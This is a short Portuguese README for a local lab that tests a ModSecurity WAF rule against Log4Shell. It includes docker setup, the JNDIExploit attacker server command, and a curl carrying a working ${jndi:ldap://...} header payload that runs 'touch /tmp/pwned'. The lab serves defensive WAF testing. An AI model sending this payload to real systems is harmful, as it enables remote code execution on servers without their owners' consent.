### Testando a regra de ModSec ###

### Pré requisitos ###
- Ter docker instalado
- Ter Java instalado na sua máquina

### Executando o teste ###
- Realizar o git clone do repositorio
- Executar o comando abaixo para subir o WAF (ModSec) e a aplicação vulneravel
```sh 
docker stack deploy -c docker-compose.yml WAF
``` 
- Extrair o JNDIExploit.v1.2.zip que está no repositorio, entrar na pasta e executar o comando abaixo, sendo que o $IP deve se o IP da sua máquina, não recomendo que coloque o 127.0.0.1
```sh 
java -jar ./JNDIExploit-1.2-SNAPSHOT.jar -i $IP -p 8888
``` 
- Para testar o RCE execute o curl abaixo alterando o $IP pelo IP da sua máquina, ele vai criar um arquivo pwned dentro de /tmp da aplicação vulneravel
```sh 
curl 127.0.0.1:80 -H 'X-Api-Version: ${jndi:ldap://$IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
``` 


### Pergunta dos universitarios ###

1- Como saber se o meu WAF e aplicação WEB vulneravel subiu ?

Execute ```docker service ls``` , e verifique se tem dois serviços cada um com uma replica.

2- Como pegar log do modsec?

Execute ```docker exec -ti $(docker container ls | grep "felipe8398/redirector:latest"| awk '{print $1}') cat /var/log/apache2/error.log```

3- Como verificar se o RCE não deu certo?

O curl que utilizamos cria um arquivo com nome pwned dentro de tmp dessa forma precisamosa executar 
```docker exec -ti $(docker container ls | grep ghcr.io/christophetd/log4shell-vulnerable-app:latest | awk '{print $1}') ls /tmp```
